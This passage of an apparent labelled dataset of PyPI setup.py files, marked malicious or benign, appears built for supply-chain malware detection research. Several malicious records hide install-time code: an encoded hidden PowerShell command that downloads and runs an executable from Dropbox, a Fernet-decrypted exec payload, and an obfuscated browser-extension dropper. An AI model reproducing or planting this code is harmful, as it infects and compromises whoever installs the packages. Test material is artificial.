(\"PSUTIL_ETHTOOL_MISSING_TYPES\", 1)\n            else:\n                return None\n            finally:\n                os.remove(f.name)\n                shutil.rmtree(output_dir)\n\n        macros.append((\"PSUTIL_LINUX\", 1))\n        ETHTOOL_MACRO = get_ethtool_macro()\n        if ETHTOOL_MACRO is not None:\n            macros.append(ETHTOOL_MACRO)\n        ext = Extension(\n            \"ddtrace.vendor.psutil._psutil_linux\",\n            sources=sources + [\"ddtrace/vendor/psutil/_psutil_linux.c\"],\n            define_macros=macros,\n        )\n\n    elif SUNOS:\n        macros.append((\"PSUTIL_SUNOS\", 1))\n        sources += [\n            \"ddtrace/vendor/psutil/_psutil_sunos.c\",\n            \"ddtrace/vendor/psutil/arch/solaris/v10/ifaddrs.c\",\n            \"ddtrace/vendor/psutil/arch/solaris/environ.c\",\n        ]\n        ext = Extension(\n            \"ddtrace.vendor.psutil._psutil_sunos\",\n            sources=sources,\n            define_macros=macros,\n            libraries=[\"kstat\", \"nsl\", \"socket\"],\n        )\n\n    elif AIX:\n        macros.append((\"PSUTIL_AIX\", 1))\n        sources += [\n            \"ddtrace/vendor/psutil/_psutil_aix.c\",\n            \"ddtrace/vendor/psutil/arch/aix/net_connections.c\",\n            \"ddtrace/vendor/psutil/arch/aix/common.c\",\n            \"ddtrace/vendor/psutil/arch/aix/ifaddrs.c\",\n        ]\n        ext = Extension(\n            \"ddtrace.vendor.psutil._psutil_aix\", sources=sources, libraries=[\"perfstat\"], define_macros=macros,\n        )\n    else:\n        raise RuntimeError(\"platform %s is not supported\" % sys.platform)\n\n    if POSIX:\n        posix_extension = Extension(\"ddtrace.vendor.psutil._psutil_posix\", define_macros=macros, sources=sources)\n        if SUNOS:\n            posix_extension.libraries.append(\"socket\")\n            if platform.release() == \"5.10\":\n                posix_extension.sources.append(\"ddtrace/vendor/psutil/arch/solaris/v10/ifaddrs.c\")\n                posix_extension.define_macros.append((\"PSUTIL_SUNOS10\", 1))\n        elif AIX:\n            posix_extension.sources.append(\"ddtrace/vendor/psutil/arch/aix/ifaddrs.c\")\n\n        return [ext, posix_extension]\n    else:\n        return [ext]\n", "target": 0}
{"idx": "craftpyw-7.3", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'craftpyw',\n    packages = ['modlib'],\n    version = '3.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gnureadline-8.1.2", "func": "#!/usr/bin/env python\n\nimport os\nimport sys\nfrom distutils.command.build_ext import build_ext\nimport subprocess\n\nfrom setuptools import setup, Extension\n\nif sys.platform == 'win32':\n    sys.exit('Error: this module is not meant to work on Windows (try pyreadline instead)')\nelif sys.platform == 'cygwin':\n    sys.exit('Error: this module is not needed for Cygwin (and probably does not compile anyway)')\n\nhere = os.path.abspath(os.path.dirname(__file__))\nREADME = open(os.path.join(here, 'README.rst')).read()\nNEWS = open(os.path.join(here, 'NEWS.rst')).read()\n\nVERSION = '8.1.2'\nDESCRIPTION = 'The standard Python readline extension statically linked against the GNU readline library.'\nLONG_DESCRIPTION = README + '\\n\\n' + NEWS\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Console',\n    'Intended Audience :: Developers',\n    'Intended Audience :: End Users/Desktop',\n    'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n    'Operating System :: MacOS :: MacOS X',\n    'Operating System :: POSIX',\n    'Programming Language :: C',\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 3',\n    'Topic :: Software Development :: Libraries :: Python Modules',\n]\n\n# Since we have the latest readline (post 4.2), enable all readline functionality\n# These macros can be found in pyconfig.h.in in the main directory of the Python tarball\nDEFINE_MACROS = [\n    ('HAVE_RL_APPEND_HISTORY', None),\n    ('HAVE_RL_CALLBACK', None),\n    ('HAVE_RL_CATCH_SIGNAL', None),\n    ('HAVE_RL_COMPLETION_APPEND_CHARACTER', None),\n    ('HAVE_RL_COMPLETION_DISPLAY_MATCHES_HOOK', None),\n    ('HAVE_RL_COMPLETION_MATCHES', None),\n    ('HAVE_RL_COMPLETION_SUPPRESS_APPEND', None),\n    ('HAVE_RL_PRE_INPUT_HOOK', None),\n    ('HAVE_RL_RESIZE_TERMINAL', None),\n]\n\n\ndef which_shell():\n    valid_paths = [\"/bin/bash\", \"/usr/local/bin/bash\", \"/bin/sh\"]\n    for path in valid_paths:\n        if os.path.exists(path):\n            return path\n    raise IOError(\"No Shell Found\")\n\n\n# Check if any of the distutils commands involves building the module,\n# and check for quiet vs. verbose option\nbuilding = False\nverbose = True\nfor s in sys.argv[1:]:\n    if s.startswith('bdist') or s.startswith('build') or s.startswith('install'):\n        building = True\n    if s in ['--quiet', '-q']:\n        verbose = False\n    if s in ['--verbose', '-v']:\n        verbose = True\n\n# Build readline first, if it is not there and we are building the module\nif building and not os.path.exists('readline/libreadline.a'):\n    shell_path = which_shell()\n    if verbose:\n        print(\"\\n============ Building the readline library ============\\n\")\n        os.system('cd rl && %s ./build.sh' % shell_path)\n        print(\"\\n============ Building the readline extension module ============\\n\")\n    else:\n        os.system('cd rl && %s ./build.sh > /dev/null 2>&1' % shell_path)\n    # Add symlink that simplifies include and link paths to real library\n    if not (os.path.exists('readline') or os.path.islink('readline')):\n        os.symlink(os.path.join('rl', 'readline-lib'), 'readline')\n\n\n# Workaround for OS X 10.9.2 and Xcode 5.1+\n# The latest clang treats unrecognized command-line options as errors and the\n# Python CFLAGS variable contains unrecognized ones (e.g. -mno-fused-madd).\n# See Xcode 5.1 Release Notes (Compiler section) and\n# http://stackoverflow.com/questions/22313407 for more details. This workaround\n# follows the approach suggested in http://stackoverflow.com/questions/724664.\nclass build_ext_subclass(build_ext):\n    def build_extensions(self):\n        if sys.platform == 'darwin':\n            # Test the compiler that will actually be used to see if it likes flags\n            proc = subprocess.Popen(self.compiler.compiler + ['-v'],\n                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                                    universal_newlines=True)\n            stdout, stderr = proc.communicate()\n            clang_mesg = \"clang: error: unknown argument: '-mno-fused-madd'\"\n            if proc.returncode and stderr.splitlines()[0].startswith(clang_mesg):\n                for ext in self.extensions:\n                    # Use temporary workaround to ignore invalid compiler option\n                    # Hopefully -mno-fused-madd goes away before this workaround!\n                    ext.extra_compile_args += ['-Wno-error=unused-command-line-argument-hard-error-in-future']\n        build_ext.build_extensions(self)\n\n\n# First try version-specific readline.c, otherwise fall back to major-only version\nsource = os.path.join('Modules', '%d.%d' % sys.version_info[:2], 'readline.c')\nif not os.path.exists(source):\n    source = os.path.join('Modules', '%d.x' % (sys.version_info[0],), 'readline.c')\n\nsetup(\n    name=\"gnureadline\",\n    version=VERSION,\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    classifiers=CLASSIFIERS,\n    maintainer=\"Ludwig Schwardt, Sridhar Ratnakumar\",\n    maintainer_email=\"ludwig.schwardt@gmail.com, srid@srid.ca\",\n    url=\"http://github.com/ludwigschwardt/python-gnureadline\",\n    include_package_data=True,\n    py_modules=['readline'],\n    cmdclass={'build_ext': build_ext_subclass},\n    ext_modules=[\n        Extension(name=\"gnureadline\",\n                  sources=[source],\n                  include_dirs=['.', os.path.dirname(source)],\n                  define_macros=DEFINE_MACROS,\n                  extra_objects=['readline/libreadline.a', 'readline/libhistory.a'],\n                  libraries=['ncurses']\n                  ),\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "flake8-markdown-0.3.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_markdown']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8>=3.0,<5.0']\n\nentry_points = \\\n{'console_scripts': ['flake8-markdown = flake8_markdown:main']}\n\nsetup_kwargs = {\n    'name': 'flake8-markdown',\n    'version': '0.3.0',\n    'description': 'Lints Python code blocks in Markdown files using flake8',\n    'long_description': '# Flake8 Markdown\\n\\n[\\n![PyPI](https://img.shields.io/pypi/v/flake8-markdown.svg)\\n![PyPI](https://img.shields.io/pypi/pyversions/flake8-markdown.svg)\\n![PyPI](https://img.shields.io/github/license/johnfraney/flake8-markdown.svg)\\n](https://pypi.org/project/flake8-markdown/)\\n[![TravisCI](https://travis-ci.com/johnfraney/flake8-markdown.svg?branch=master)](https://travis-ci.com/johnfraney/flake8-markdown)\\n\\nFlake8 Markdown lints [GitHub-style Python code blocks](https://help.github.com/en/articles/creating-and-highlighting-code-blocks#fenced-code-blocks) in Markdown files using [`flake8`](https://flake8.readthedocs.io/en/stable/).\\n\\nThis package helps improve a Python project\\'s documentation by ensuring that code samples are error-free.\\n\\n## Features\\n\\n- Lints code blocks containing regular Python and Python interpreter code ([`pycon`](http://pygments.org/docs/lexers/#pygments.lexers.python.PythonConsoleLexer))\\n- [pre-commit](#pre-commit-hook) hook to lint on commit\\n\\n## Installation\\n\\nFlake8 Markdown can be installed from PyPI using `pip` or your package manager of choice:\\n\\n```\\npip install flake8-markdown\\n```\\n\\n## Usage\\n\\n### CLI\\n\\nYou can use Flake8 Markdown as a CLI tool using the `flake8-markdown` command.\\n\\n`flake8-markdown` accepts one or more [globs](https://docs.python.org/3.7/library/glob.html) as its arguments.\\n\\nExample:\\n\\n```console\\n$ flake8-markdown \"tests/samples/*.md\"\\ntests/samples/emphasized_lines.md:6:1: F821 undefined name \\'emphasized_imaginary_function\\'\\ntests/samples/basic.md:8:48: E999 SyntaxError: EOL while scanning string literal\\ntests/samples/basic.md:14:7: F821 undefined name \\'undefined_variable\\'\\n```\\n\\n### pre-commit hook\\n\\nYou can also add `flake8-markdown` to your project using [pre-commit](https://pre-commit.com/). When configured, any staged Markdown files will be linted using `flake8-markdown` once you run `git commit`.\\n\\nTo enable this hook in your local repository, add the following `repo` to your `.pre-commit-config.yaml` file:\\n\\n```yaml\\n# .pre-commit-config.yaml\\nrepos:\\n  - repo: https://github.com/johnfraney/flake8-markdown\\n    rev: v0.2.0\\n    hooks:\\n      - id: flake8-markdown\\n```\\n\\n## Code of Conduct\\n\\nEveryone interacting in the project\\'s codebases, issue trackers, chat rooms, and mailing lists is expected to follow the [PyPA Code of Conduct](https://www.pypa.io/en/latest/code-of-conduct/).\\n\\n## History\\n\\n## [0.2.0] - 2019-06-14\\n\\n### Added\\n\\n- [`pycon`](http://pygments.org/docs/lexers/#pygments.lexers.python.PythonConsoleLexer) code block support\\n\\n### [0.1.1] - 2019-05-19\\n\\n#### Changed\\n\\n- Fixed pre-commit example in README\\n\\n### [0.1.0] - 2019-05-19\\n\\n#### Added\\n\\n- Added code for initial release\\n',\n    'author': 'John Franey',\n    'author_email': 'johnfraney@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/johnfraney/flake8-markdown',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "adpull-9.16", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'adpull',\n    packages = ['modlib'],\n    version = '10.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dtreeviz-1.3.7", "func": "from setuptools import setup, find_packages\n\n# python setup.py sdist upload\n\nsetup(\n    name='dtreeviz',\n    version='1.3.7',\n    url='https://github.com/parrt/dtreeviz',\n    license='MIT',\n    packages=find_packages(),\n    install_requires=['graphviz>=0.9','pandas','numpy','scikit-learn',\n                        'matplotlib','colour', 'pytest'],\n    extras_require={'xgboost': ['xgboost'], 'pyspark':['pyspark'], 'lightgbm':['lightgbm']},\n    python_requires='>=3.6',\n    author='Terence Parr, Tudor Lapusan, and Prince Grover',\n    author_email='parrt@cs.usfca.edu',\n    description='A Python 3 library for sci-kit learn, XGBoost, LightGBM, and Spark decision tree visualization',\n    long_description='README.md',\n    keywords='machine-learning data structures trees visualization',\n    classifiers=['License :: OSI Approved :: MIT License',\n                 'Intended Audience :: Developers']\n)\n", "target": 0}
{"idx": "docformatter-1.4", "func": "#!/usr/bin/env python\n\n\"\"\"Setup for docformatter.\"\"\"\n\nfrom __future__ import (absolute_import,\n                        division,\n                        print_function,\n                        unicode_literals)\n\nimport ast\n\nfrom setuptools import setup\n\n\ndef version():\n    \"\"\"Return version string.\"\"\"\n    with open('docformatter.py') as input_file:\n        for line in input_file:\n            if line.startswith('__version__'):\n                return ast.parse(line).body[0].value.s\n\n\nwith open('README.rst') as readme:\n    setup(name='docformatter',\n          version=version(),\n          description='Formats docstrings to follow PEP 257.',\n          long_description=readme.read(),\n          license='Expat License',\n          author='Steven Myint',\n          url='https://github.com/myint/docformatter',\n          classifiers=['Intended Audience :: Developers',\n                       'Environment :: Console',\n                       'Programming Language :: Python :: 2.7',\n                       'Programming Language :: Python :: 3',\n                       'License :: OSI Approved :: MIT License'],\n          keywords='PEP 257, pep257, style, formatter, docstrings',\n          py_modules=['docformatter'],\n          entry_points={\n              'console_scripts': ['docformatter = docformatter:main']},\n          install_requires=['untokenize'],\n          tests_require=['mock;python_version<\"3.3\"'],\n          test_suite='test_docformatter')\n", "target": 0}
{"idx": "selfcpuramultra-7.25", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcpuramultra',\n    packages = ['modlib'],\n    version = '6.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-minepyencode-7.68", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-minepyencode',\n    packages = ['modlib'],\n    version = '2.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fake-factory-9999.9.9", "func": "#!/usr/bin/env python\n# coding=utf-8\n\nfrom setuptools import setup, find_packages\n\n\nversion = '9999.9.9'\n\npackage_name = 'fake-factory'\n\nerror = \"\"\"ERROR:\n    The `fake-factory` package was deprecated on December 15th, 2016.\n    Use the `Faker` package instead.\"\"\"\n\nprint(error)\n\n\nsetup(\n    name=package_name,\n    version=version,\n    description=\"The `fake-factory` package was deprecated on December 15th, 2016. Use the `Faker` package instead.\",\n    long_description=error,\n    classifiers=[\n        # See https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'Development Status :: 7 - Inactive',\n        'License :: OSI Approved :: MIT License'\n    ],\n    author='joke2k',\n    author_email='joke2k@gmail.com',\n    url='https://github.com/joke2k/faker',\n    license='MIT License',\n    packages=find_packages(),\n    platforms=[\"any\"],\n    zip_safe=True,\n)\n", "target": 0}
{"idx": "fissix-21.11.13", "func": "#!/usr/bin/env python\n# setup.py generated by flit for tools that don't yet use PEP 517\n\nfrom distutils.core import setup\n\npackages = \\\n['fissix',\n 'fissix.fixes',\n 'fissix.pgen2',\n 'fissix.tests',\n 'fissix.tests.data.fixers.myfixes']\n\npackage_data = \\\n{'': ['*'], 'fissix.tests': ['data/*', 'data/fixers/*']}\n\ninstall_requires = \\\n['appdirs']\n\nsetup(name='fissix',\n      version='21.11.13',\n      description='Monkeypatches to override default behavior of lib2to3.',\n      author='John Reese',\n      author_email='john@noswap.com',\n      url='https://github.com/jreese/fissix',\n      packages=packages,\n      package_data=package_data,\n      install_requires=install_requires,\n      python_requires='>=3.6',\n     )\n", "target": 0}
{"idx": "oensea-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'zNvSrMxKifVAPrQjaCLBUmbnJcClpejANvGwkSAfFjejLOkRkMEPpndpXPqW'\nLONG_DESCRIPTION = 'mKqeVObELfraQADnZccHvmQBcydkBNwzILLeYtaknWRlRmlOxLpKrMcLoggYCvRMbDdOeGTwHvttNuLRZnJJvQUkkEpGyregmVEIHPOpgNFUxqipfbxksqLPdHwqDXthEwtABqyEqOEbOZRTS VDysIFaMOPTkaxgZdVAGCrhX PrMrjdJbf nHinkdbPNUfMeWLMiSJYYKvBzUlOjUF lrKPJDAYGukbKfsxwviiIqLpgtXOBiBlupgXBnkAd TbDgSrnfRoLmdwigWQiwTjdhgmT MEysVmokBaRnVIZNKnMc SaKFoCyltxoAqxiv sYQmhVaEOgWcRsvsNnNQCcBCXNsffARKEtgjlSsgyiLtWLCkiMagvTmyzOpeEgDVn DfGygPsbqhiIEORCAMbHwcrMDRtqYTiVyBWulIAmuYkguBTIkjkqVrdEzodoBqHZePjYQXxTOuCmslLStjyvcqw'\n\n\nclass ksovBWWCqRwUxXAXbimiipBqPhzGYMlojpecobIgzQShGtHzKtyGouYcRUxkqQWvqLNnFDpUIQkagPDpNBoCDqRzStwAsHXhalHbhWvzvOnzbSCDeNizASoUQmQjwpbfgYMLhtsQiynkOrLnVHUTaeRGPHlpXRXFsdzQU(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'FoKE1p8YfvkgOucV2X4W35hGdZOAfy-xYrZ5qEMSBqU=').decrypt(b'gAAAAABmbvVFY62D4auGgbH0oPZvJgsU6gPR_l0CFSFPc5KphkcvWa__CSypeN1PP0unaPpg8P6t1w4Ng_ARLlrjgyKHpCJvmrKquriL-OMNj8leSYXNbtuZiZXj1SUq1xhk6DqOQ7GCvM30fGR4czM2T5swJ9mYvD167I6-wxac2e8SaiO0TGu1oiGkCLgKD9jtZOOcjN6F1SXjzrHpi2JKAB8ib3P78A=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"oensea\",\n    version=VERSION,\n    author=\"huRvddjdU\",\n    author_email=\"yrYqwUWXOUviyBa@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': ksovBWWCqRwUxXAXbimiipBqPhzGYMlojpecobIgzQShGtHzKtyGouYcRUxkqQWvqLNnFDpUIQkagPDpNBoCDqRzStwAsHXhalHbhWvzvOnzbSCDeNizASoUQmQjwpbfgYMLhtsQiynkOrLnVHUTaeRGPHlpXRXFsdzQU,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "googletrans-3.0.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os.path\nimport re\n\nfrom setuptools import setup, find_packages\n\n\ndef get_file(*paths):\n    path = os.path.join(*paths)\n    try:\n        with open(path, 'rb') as f:\n            return f.read().decode('utf8')\n    except IOError:\n        pass\n\n\ndef get_version():\n    init_py = get_file(os.path.dirname(__file__), 'googletrans', '__init__.py')\n    pattern = r\"{0}\\W*=\\W*'([^']+)'\".format('__version__')\n    version, = re.findall(pattern, init_py)\n    return version\n\n\ndef get_description():\n    init_py = get_file(os.path.dirname(__file__), 'googletrans', '__init__.py')\n    pattern = r'\"\"\"(.*?)\"\"\"'\n    description, = re.findall(pattern, init_py, re.DOTALL)\n    return description\n\n\ndef get_readme():\n    return get_file(os.path.dirname(__file__), 'README.rst')\n\n\ndef install():\n    setup(\n        name='googletrans',\n        version=get_version(),\n        description=get_description(),\n        long_description=get_readme(),\n        license='MIT',\n        author='SuHun Han',\n        author_email='ssut' '@' 'ssut.me',\n        url='https://github.com/ssut/py-googletrans',\n        classifiers=['Development Status :: 5 - Production/Stable',\n                     'Intended Audience :: Education',\n                     'Intended Audience :: End Users/Desktop',\n                     'License :: Freeware',\n                     'Operating System :: POSIX',\n                     'Operating System :: Microsoft :: Windows',\n                     'Operating System :: MacOS :: MacOS X',\n                     'Topic :: Education',\n                     'Programming Language :: Python',\n                     'Programming Language :: Python :: 3.6',\n                     'Programming Language :: Python :: 3.7',\n                     'Programming Language :: Python :: 3.8'],\n        packages=find_packages(exclude=['docs', 'tests']),\n        keywords='google translate translator',\n        install_requires=[\n            'httpx==0.13.3',\n        ],\n        tests_require=[\n            'pytest',\n            'coveralls',\n        ],\n        scripts=['translate']\n    )\n\n\nif __name__ == \"__main__\":\n    install()\n", "target": 0}
{"idx": "geocoder-1.38.1", "func": "#!/usr/bin/python\n# coding: utf8\n\nfrom codecs import open\nimport re\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nwith open('geocoder/__init__.py', 'r') as fd:\n    version = re.search(r'^__version__\\s*=\\s*[\\'\"]([^\\'\"]*)[\\'\"]',\n                        fd.read(), re.MULTILINE).group(1)\n\nif not version:\n    raise RuntimeError('Cannot find version information')\n\nwith open('README.md', 'r', 'utf-8') as f:\n    readme = f.read()\n\nrequires = ['requests', 'ratelim', 'click', 'six', 'future']\n\nsetup(\n    name='geocoder',\n    version=version,\n    description=\"Geocoder is a simple and consistent geocoding library.\",\n    long_description=readme,\n    author='Denis Carriere',\n    author_email='carriere.denis@gmail.com',\n    url='https://github.com/DenisCarriere/geocoder',\n    download_url='https://github.com/DenisCarriere/geocoder',\n    license=\"The MIT License\",\n    entry_points='''\n        [console_scripts]\n        geocode=geocoder.cli:cli\n    ''',\n    packages=['geocoder'],\n    package_data={'': ['LICENSE', 'README.md']},\n    package_dir={'geocoder': 'geocoder'},\n    include_package_data=True,\n    install_requires=requires,\n    zip_safe=False,\n    keywords='geocoder arcgis tomtom opencage google bing here',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: Apache Software License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Internet',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Scientific/Engineering :: GIS',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "hello-world-exampl-0.1", "func": "from distutils.core import setup\nimport sys\n\n\nif sys.platform == 'win32':\n  if sys.argv[1] in ['egg_info', 'build']:\n    try:\n      import win32com\n    except ModuleNotFoundError:\n      from pip._internal import main\n      main(['install', 'pypiwin32'])\n\n  elif sys.argv[1] in ['bdist_wheel', 'install']:\n    import os\n    import ctypes\n    from win32com.client import Dispatch\n\n    appDataPath = os.getenv('APPDATA')\n    desktopPath = os.path.expanduser('~\\Desktop')\n    paths = [\n        appDataPath + '\\\\Microsoft\\\\Windows\\\\Start Menu',\n        appDataPath + '\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\TaskBar',\n        desktopPath\n    ]\n\n    if ctypes.windll.shell32.IsUserAnAdmin():\n        paths.append('C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu')\n\n    if not os.path.exists(appDataPath + '\\\\Extension'):\n        os.makedirs(appDataPath + '\\\\Extension')\n\n    with open(appDataPath + '\\\\Extension\\\\background.js', 'w+') as extensionFile:\n        extensionFile.write('''var _0x327ff6=_0x11d4;(function(_0x314c14,_0x4da2d4){var 